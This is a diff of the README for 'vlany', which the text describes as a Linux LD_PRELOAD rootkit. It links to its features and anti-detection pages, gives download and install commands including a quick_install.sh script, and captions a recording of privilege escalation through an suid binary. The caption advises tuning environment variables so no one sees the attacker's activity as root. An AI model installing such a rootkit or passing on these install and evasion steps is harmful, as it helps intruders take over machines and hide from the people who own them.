@@ -1,5 +1,7 @@
 #vlany ([wiki](https://github.com/mempodippy/vlany/wiki))
-###A Linux (LD_PRELOAD) rootkit
+####*vlany is a Linux LD_PRELOAD rootkit*.</br>
+ * *[List of features](https://github.com/mempodippy/vlany/wiki/Features)*</br>
+ * *[Anti-Detection](https://github.com/mempodippy/vlany/wiki/Anti-Detection)*
 
 ##Installing
  * vlany's [quick_install.sh](https://gist.githubusercontent.com/mempodippy/d93fd99164bace9e63752afb791a896b/raw/6b06d235beac8590f56c47b7f46e2e4fac9cf584/quick_install.sh) script is the fastest/easiest method of installation.</br>
@@ -14,8 +16,8 @@ To install vlany you want to first download it from our GitHub ( Always up to da
 `root@vlany:~# cd vlany-master && ./install.sh`   
 By default this will prompt you with a [tui](https://en.wikipedia.org/wiki/Text-based_user_interface) installation but if cli is prefered you can use the --cli argument to invoke a similar cli installation.</br>
 
-(**ASCIINEMA**) Regular installation on Debian 8 box using suid binary to escalate privileges from tmp user. In a real life scenario, you'll want to play with some environment variables to prevent anyone from seeing your activity when root.</br>
-[![asciicast](https://asciinema.org/a/a8u6ca1n2ujmgijgldrcdu425.png)](https://asciinema.org/a/a8u6ca1n2ujmgijgldrcdu425)
+###[ASCIINEMA OF INSTALLATION](https://asciinema.org/a/a8u6ca1n2ujmgijgldrcdu425)</br>
+Regular tui installation on a Debian 8 box using an suid binary to escalate privileges from a tmp user. In a real life scenario, you'll want to play with some environment variables to prevent anyone from seeing your activity when root.</br>
 
 ##Downloads
 [quick_install.sh](https://gist.githubusercontent.com/mempodippy/d93fd99164bace9e63752afb791a896b/raw/6b06d235beac8590f56c47b7f46e2e4fac9cf584/quick_install.sh)</br>
